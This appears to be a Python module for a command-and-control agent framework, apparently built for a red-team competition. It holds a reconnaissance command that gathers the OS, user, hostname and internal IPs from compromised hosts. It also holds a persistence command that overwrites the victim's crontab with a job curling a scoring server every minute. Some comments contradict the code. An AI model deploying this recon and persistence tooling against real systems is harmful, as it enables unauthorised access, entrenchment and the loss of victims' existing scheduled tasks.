from modules.agent_script_interpreter import BaseCommand
from modules.agent import BaseAgent
import time


class SystemRecon(BaseCommand):
    command_name = "system_recon"
    command_help = "\tUsage: `system_recon`\n" "\tAggregates system information.\n"

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        self.agent_class = BaseAgent(agent_id)

        self.command_ids = []

    # this is how we are gonna do it
    def run(self):
        time.sleep(1)
        # list of commands to run
        cmds = {
            "shell grep '^PRETTY_NAME=' /etc/os-release | cut -d= -f2 | tr -d '\"' ": "system.os",
            "shell whoami": "system.username",
            "shell hostname": "system.hostname",
            "shell echo \"$(ip -4 addr show | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' | paste -sd ', ' -)\"": "network.internal_ip",
        }

        for cmd, location in cmds.items():
            self.agent_class.store_command_response_on_callback(cmd, location)
            command_ids = self.agent_class.enqueue_command(cmd)
            self.command_ids.append(command_ids)

        # must return list of command ID's that were queued.
        # return self.command_ids


class CrontabCurlScoringEndpoint(BaseCommand):
    command_name = "crontab_curl_scoring_endpoint"
    command_help = (
        "\tUsage: `crontab_curl_scoring_endpoint`\n"
        "\tCurls scoring endpoint every 1 minute via crontab- RYAN SET THE TEAM NUMBER IN THE SCRIPT IF YOU HAVENT YET\n"
    )

    def __init__(self, command, args_list, agent_id):
        super().__init__(command, args_list, agent_id)
        self.agent_class = BaseAgent(agent_id)

    def run(self):
        try:
            # Create a task to ping the target every 30 seconds and also start it immediately
            schedule_cmd = "shell echo '* * * * * /usr/bin/curl -s http://10.30.0.100/persist/teamX > /dev/null 2>&1' | crontab - "
            # Enqueue the command to create the task
            schedule_id = self.agent_class.enqueue_command(schedule_cmd)
            self.agent_class.enqueue_command("shell crontab -l")

        except Exception as e:
            print("ScheduledTaskPingPersistence encountered an error:", e)
